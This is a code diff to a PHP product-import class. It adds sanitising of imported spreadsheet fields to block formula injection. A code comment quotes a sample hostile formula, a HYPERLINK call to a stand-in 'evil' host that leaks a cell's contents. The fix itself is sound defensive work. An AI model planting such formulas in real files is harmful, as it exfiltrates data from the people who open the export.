@@ -123,11 +123,18 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                 $status = $row['status'] ?? 'active';
                 $isActive = strtolower($status) === 'active';
 
+                // Strip leading formula triggers from imported strings so
+                // a tenant-uploaded row that says
+                //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
+                // doesn't land in the DB and re-export to a downloader
+                // whose spreadsheet viewer evaluates it.
+                $sanitise = fn ($v) => \App\Support\SpreadsheetSafety::sanitiseImport($v);
+
                 $productData = [
-                    'name' => $row['name'],
-                    'sku' => $row['sku'],
-                    'barcode' => $row['barcode'] ?? null,
-                    'description' => $row['description'] ?? null,
+                    'name' => $sanitise($row['name']),
+                    'sku' => $sanitise($row['sku']),
+                    'barcode' => $sanitise($row['barcode'] ?? null),
+                    'description' => $sanitise($row['description'] ?? null),
                     'category_id' => $categoryId,
                     'location_id' => $locationId,
                     'price' => $row['price'],
@@ -136,7 +143,7 @@ final class ProductsImport implements ToCollection, WithHeadingRow, SkipsOnFailu
                     'stock' => $row['stock'],
                     'min_stock' => $row['min_stock'] ?? 0,
                     'is_active' => $isActive,
-                    'notes' => $row['notes'] ?? null,
+                    'notes' => $sanitise($row['notes'] ?? null),
                     'organization_id' => $this->organizationId,
                 ];
 
